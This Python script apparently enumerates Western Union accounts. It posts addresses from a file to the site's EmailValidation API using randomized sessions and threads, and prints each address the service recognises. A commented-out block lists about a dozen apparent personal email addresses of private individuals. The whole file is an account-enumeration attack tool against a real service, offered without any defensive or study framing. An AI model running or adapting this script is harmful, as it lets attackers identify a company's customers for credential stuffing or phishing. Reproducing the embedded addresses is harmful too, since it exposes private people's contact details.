import urllib
import time
import json
from request_mods import add_request_headers
from threading import Thread, Lock
import queue
from random_requests import get_random_session_request
import time

num_worker_threads = 1
q = queue.Queue()
lock = Lock()

def make_requests():
    global q
    emails = open('emails.txt','r').readlines()
    
    # emails = [
    #     'nilavghosh@gmail.com',
    #     'nilavghosh@hotmail.com',
    #     'claggettniakia@yahoo.com',
    #     'test@test.com',
    #     'a@a.com',
    #     'marandagibson@gmail.com',
    #     'sammie-may@live.com',
    #     'ssantmier01@gmail.com',
    #     'lmhowze@yahoo.com',
    #     'stefiep00@gmail.com',
    #     'vmgingrich@sbcglobal.net']
    for email_id in emails:
        q.put(email_id)
        # request_www_westernunion_com(session_id, email_id)

def request_www_westernunion_com(email_id):
    try:
        # req = urllib.request.Request("https://www.westernunion.com/wuconnect/rest/api/v1.0/EmailValidation?timestamp=1537800289672")
        
        # add_request_headers(req)
        req, session_id = get_random_session_request()
        
        body_dict = {'email': 'nilavghosh@gmail.com',
                     'security': {'session': {'id': 'web-6ed27a12-0ca5-4adb-a0c8-fd5e7f3c403b'},
                     'version': '2'},
                     'bashPath': '/us/en'}
        body_dict['email'] = email_id
        body_dict['security']['session']['id'] = session_id
        body = json.dumps(body_dict).encode()
        # body = b"{\"email\":\"nilavghosh@gmail.com\",\"security\":{\"session\":{\"id\":\"web-6ed27a12-0ca5-4adb-a0c8-fd5e7f3c403b\"},\"version\":\"2\"},\"bashPath\":\"/us/en\"}"

        response = urllib.request.urlopen(req, body)
        # print(json.loads(response.fp.read().encode('utf-8')))
        mssg = json.loads(response.fp.read().decode('utf-8'))['error']['message']
        if "We can't find that email address" in mssg:
            pass
        else:
            print(email_id)

    except urllib.error.URLError as e:
        if not hasattr(e, "code"):
            return False
        response = e
    except:
        return False

    return True


def worker():
    while True:
        with lock:
            item = q.get()
        if item is None:
            break
        request_www_westernunion_com(item)
        # q.task_done()
        # time.sleep(1)

threads = []
for i in range(num_worker_threads):
    t = Thread(target=worker)
    t.start()
    threads.append(t)


make_requests()


# block until all tasks are done
# q.join()

# stop workers
for i in range(num_worker_threads):
    q.put(None)
for t in threads:
    t.join()










# def worker():
#     while True:
#         item = q.get()
#         if item is None:
#             break
#         do_work(item)
#         q.task_done()

# threads = []
# for i in range(num_worker_threads):
#     t = threading.Thread(target=worker)
#     t.start()
#     threads.append(t)

# for item in source():
#     q.put(item)

# # block until all tasks are done
# q.join()

# # stop workers
# for i in range(num_worker_threads):
#     q.put(None)
# for t in threads:
#     t.join()